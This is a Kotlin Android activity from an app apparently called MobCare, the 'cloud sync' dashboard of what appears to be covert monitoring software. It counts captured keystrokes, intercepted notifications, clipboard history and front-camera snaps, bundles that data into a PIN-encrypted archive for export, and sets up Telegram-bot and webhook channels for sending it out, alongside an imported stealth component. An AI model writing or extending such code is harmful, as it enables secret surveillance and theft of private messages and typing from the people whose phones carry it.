package com.mobcare.dashboard

import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import com.mobcare.R
import com.mobcare.audit.AuditLogManager
import com.mobcare.audit.ClipboardVaultManager
import com.mobcare.audit.DeletedAppsVault
import com.mobcare.audit.NotificationVaultManager
import com.mobcare.security.IntruderCaptureManager
import com.mobcare.security.StealthManager
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class CloudSyncActivity : AppCompatActivity() {

    private lateinit var tvVaultEngineBadge: TextView
    private lateinit var tvVaultStats: TextView
    private lateinit var btnExportVault: Button

    private lateinit var tvTelegramBadge: TextView
    private lateinit var etTelegramToken: EditText
    private lateinit var etTelegramChatId: EditText
    private lateinit var btnSaveTelegram: Button
    private lateinit var btnTestTelegram: Button

    private lateinit var tvWebhookBadge: TextView
    private lateinit var etWebhookUrl: EditText
    private lateinit var btnSaveWebhook: Button
    private lateinit var btnTestWebhook: Button

    private lateinit var btnPurgeLogs: Button

    private val prefsName = "mobcare_cloud_sync_prefs"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_cloud_sync)

        tvVaultEngineBadge = findViewById(R.id.tvVaultEngineBadge)
        tvVaultStats = findViewById(R.id.tvVaultStats)
        btnExportVault = findViewById(R.id.btnExportVault)

        tvTelegramBadge = findViewById(R.id.tvTelegramBadge)
        etTelegramToken = findViewById(R.id.etTelegramToken)
        etTelegramChatId = findViewById(R.id.etTelegramChatId)
        btnSaveTelegram = findViewById(R.id.btnSaveTelegram)
        btnTestTelegram = findViewById(R.id.btnTestTelegram)

        tvWebhookBadge = findViewById(R.id.tvWebhookBadge)
        etWebhookUrl = findViewById(R.id.etWebhookUrl)
        btnSaveWebhook = findViewById(R.id.btnSaveWebhook)
        btnTestWebhook = findViewById(R.id.btnTestWebhook)

        btnPurgeLogs = findViewById(R.id.btnPurgeLogs)

        loadDispatcherConfigs()
        updateStats()

        btnExportVault.setOnClickListener {
            exportEncryptedVault()
        }

        btnSaveTelegram.setOnClickListener {
            saveTelegramConfig()
        }

        btnTestTelegram.setOnClickListener {
            testTelegramPing()
        }

        btnSaveWebhook.setOnClickListener {
            saveWebhookConfig()
        }

        btnTestWebhook.setOnClickListener {
            testWebhookPing()
        }

        btnPurgeLogs.setOnClickListener {
            purgeLocalLogs()
        }
    }

    override fun onResume() {
        super.onResume()
        updateStats()
    }

    private fun updateStats() {
        val auditCount = AuditLogManager.getLogs(this).size
        val notifCount = NotificationVaultManager.getNotifications(this).size
        val clipCount = ClipboardVaultManager.getClipboardHistory(this).size
        val deletedCount = DeletedAppsVault.getDeletedApps(this).size
        val intruderCount = IntruderCaptureManager.getIntruderRecords(this).size

        tvVaultStats.text = "• Keystrokes & Audit Logs: $auditCount events\n" +
                "• Intercepted Notifications: $notifCount alerts\n" +
                "• Captured Clipboard Grid: $clipCount items\n" +
                "• Deleted Applications: $deletedCount archived\n" +
                "• Intruder Front-Camera Snaps: $intruderCount records"
    }

    private fun exportEncryptedVault() {
        try {
            val root = JSONObject().apply {
                put("generated_at", System.currentTimeMillis())
                put("device_model", android.os.Build.MODEL)
                put("audit_logs", JSONArray(AuditLogManager.getLogs(this@CloudSyncActivity).map { "${it.appName} [${it.timestamp}]: ${it.content}" }))
                put("deleted_apps", JSONArray(DeletedAppsVault.getDeletedApps(this@CloudSyncActivity).map {
                    JSONObject().apply {
                        put("pkg", it.packageName)
                        put("name", it.appName)
                        put("time", it.deletedTimestamp)
                    }
                }))
                put("notifications", JSONArray(NotificationVaultManager.getNotifications(this@CloudSyncActivity).map {
                    JSONObject().apply {
                        put("pkg", it.packageName)
                        put("title", it.title)
                        put("text", it.text)
                        put("time", it.timestamp)
                    }
                }))
                put("clipboard", JSONArray(ClipboardVaultManager.getClipboardHistory(this@CloudSyncActivity).map {
                    JSONObject().apply {
                        put("text", it.content)
                        put("time", it.timestamp)
                    }
                }))
            }

            val plainBytes = root.toString().toByteArray(Charsets.UTF_8)
            val pin = StealthManager.getMasterPin(this)

            // Derive 256-bit key using SHA-256 of master PIN
            val sha256 = MessageDigest.getInstance("SHA-256")
            val keyBytes = sha256.digest(pin.toByteArray(Charsets.UTF_8))
            val secretKey = SecretKeySpec(keyBytes, "AES")

            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            cipher.init(Cipher.ENCRYPT_MODE, secretKey)
            val iv = cipher.iv
            val cipherBytes = cipher.doFinal(plainBytes)

            // Pack: [IV Length (1 byte)] + [IV] + [Ciphertext]
            val exportDir = File(cacheDir, "exports")
            if (!exportDir.exists()) exportDir.mkdirs()
            val vaultFile = File(exportDir, "mobcare_vault_${System.currentTimeMillis()}.mcsafe")

            FileOutputStream(vaultFile).use { fos ->
                fos.write(iv.size)
                fos.write(iv)
                fos.write(cipherBytes)
            }

            val uri: Uri = try {
                FileProvider.getUriForFile(this, "${packageName}.fileprovider", vaultFile)
            } catch (e: Exception) {
                Uri.fromFile(vaultFile)
            }

            val sendIntent = Intent(Intent.ACTION_SEND).apply {
                type = "application/octet-stream"
                putExtra(Intent.EXTRA_STREAM, uri)
                putExtra(Intent.EXTRA_SUBJECT, "MobCare Encrypted Security Vault")
                putExtra(Intent.EXTRA_TEXT, "MobCare AES-256 Encrypted Telemetry Archive (Decryption Key: Master PIN)")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            }
            startActivity(Intent.createChooser(sendIntent, "Export Encrypted Archive"))

        } catch (e: Exception) {
            e.printStackTrace()
            Toast.makeText(this, "Export failed: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun loadDispatcherConfigs() {
        val sp = getSharedPreferences(prefsName, Context.MODE_PRIVATE)
        val token = sp.getString("telegram_token", "") ?: ""
        val chatId = sp.getString("telegram_chat_id", "") ?: ""
        val webhookUrl = sp.getString("custom_webhook_url", "") ?: ""

        etTelegramToken.setText(token)
        etTelegramChatId.setText(chatId)
        etWebhookUrl.setText(webhookUrl)

        if (token.isNotEmpty() && chatId.isNotEmpty()) {
            tvTelegramBadge.text = "ACTIVE"
            tvTelegramBadge.setTextColor(Color.parseColor("#81C995"))
        } else {
            tvTelegramBadge.text = "STANDBY"
            tvTelegramBadge.setTextColor(Color.parseColor("#FDD663"))
        }

        if (webhookUrl.isNotEmpty()) {
            tvWebhookBadge.text = "ACTIVE"
            tvWebhookBadge.setTextColor(Color.parseColor("#81C995"))
        } else {
            tvWebhookBadge.text = "STANDBY"
            tvWebhookBadge.setTextColor(Color.parseColor("#FDD663"))
        }
    }

    private fun saveTelegramConfig() {
        val token = etTelegramToken.text.toString().trim()
        val chatId = etTelegramChatId.text.toString().trim()

        val sp = getSharedPreferences(prefsName, Context.MODE_PRIVATE)
        sp.edit().putString("telegram_token", token).putString("telegram_chat_id", chatId).apply()

        if (token.isNotEmpty() && chatId.isNotEmpty()) {
            tvTelegramBadge.text = "ACTIVE"
            tvTelegramBadge.setTextColor(Color.parseColor("#81C995"))
            Toast.makeText(this, "Telegram config saved & active", Toast.LENGTH_SHORT).show()
        } else {
            tvTelegramBadge.text = "STANDBY"
            tvTelegramBadge.setTextColor(Color.parseColor("#FDD663"))
            Toast.makeText(this, "Telegram dispatcher in standby", Toast.LENGTH_SHORT).show()
        }
    }

    private fun saveWebhookConfig() {
        val url = etWebhookUrl.text.toString().trim()
        val sp = getSharedPreferences(prefsName, Context.MODE_PRIVATE)
        sp.edit().putString("custom_webhook_url", url).apply()

        if (url.isNotEmpty()) {
            tvWebhookBadge.text = "ACTIVE"
            tvWebhookBadge.setTextColor(Color.parseColor("#81C995"))
            Toast.makeText(this, "Custom Webhook saved & active", Toast.LENGTH_SHORT).show()
        } else {
            tvWebhookBadge.text = "STANDBY"
            tvWebhookBadge.setTextColor(Color.parseColor("#FDD663"))
            Toast.makeText(this, "Webhook dispatcher in standby", Toast.LENGTH_SHORT).show()
        }
    }

    private fun testTelegramPing() {
        val token = etTelegramToken.text.toString().trim()
        val chatId = etTelegramChatId.text.toString().trim()

        if (token.isEmpty() || chatId.isEmpty()) {
            Toast.makeText(this, "Please enter Bot Token and Chat ID first", Toast.LENGTH_SHORT).show()
            return
        }

        Toast.makeText(this, "Sending Telegram test dispatch...", Toast.LENGTH_SHORT).show()

        Thread {
            try {
                val message = "[MobCare Sentinel] Telemetry dispatcher link online. Device: ${android.os.Build.MODEL}"
                val encodedMsg = URLEncoder.encode(message, "UTF-8")
                val url = URL("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=$encodedMsg")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 8000
                conn.readTimeout = 8000
                val code = conn.responseCode
                runOnUiThread {
                    if (code in 200..299) {
                        Toast.makeText(this, "Telegram dispatch successful! Check your bot.", Toast.LENGTH_LONG).show()
                    } else {
                        Toast.makeText(this, "Telegram API returned HTTP $code. Check token/chat ID.", Toast.LENGTH_LONG).show()
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
                runOnUiThread {
                    Toast.makeText(this, "Connection error: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }

    private fun testWebhookPing() {
        val webhookUrl = etWebhookUrl.text.toString().trim()
        if (webhookUrl.isEmpty()) {
            Toast.makeText(this, "Please enter Webhook URL first", Toast.LENGTH_SHORT).show()
            return
        }

        Toast.makeText(this, "Sending Webhook test ping...", Toast.LENGTH_SHORT).show()

        Thread {
            try {
                val payload = JSONObject().apply {
                    put("content", "[MobCare Sentinel] Webhook connection verified.\nDevice: ${android.os.Build.MODEL}")
                    put("username", "MobCare Sentinel")
                    put("device", android.os.Build.MODEL)
                    put("event", "WEBHOOK_VERIFY")
                    put("timestamp", System.currentTimeMillis())
                }

                val url = URL(webhookUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.setRequestProperty("User-Agent", "MobCare-Sentinel/1.0")
                conn.connectTimeout = 8000
                conn.readTimeout = 8000
                conn.doOutput = true

                OutputStreamWriter(conn.outputStream, "UTF-8").use { writer ->
                    writer.write(payload.toString())
                    writer.flush()
                }

                val code = conn.responseCode
                runOnUiThread {
                    if (code in 200..299) {
                        Toast.makeText(this, "Webhook dispatch successful! HTTP $code", Toast.LENGTH_LONG).show()
                    } else {
                        Toast.makeText(this, "Webhook server returned HTTP $code.", Toast.LENGTH_LONG).show()
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
                runOnUiThread {
                    Toast.makeText(this, "Webhook error: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }

    private fun purgeLocalLogs() {
        AuditLogManager.clearLogs(this)
        ClipboardVaultManager.clearClipboard(this)
        NotificationVaultManager.clearNotifications(this)
        updateStats()
        Toast.makeText(this, "Local audit & clipboard logs scrubbed cleanly.", Toast.LENGTH_SHORT).show()
    }
}
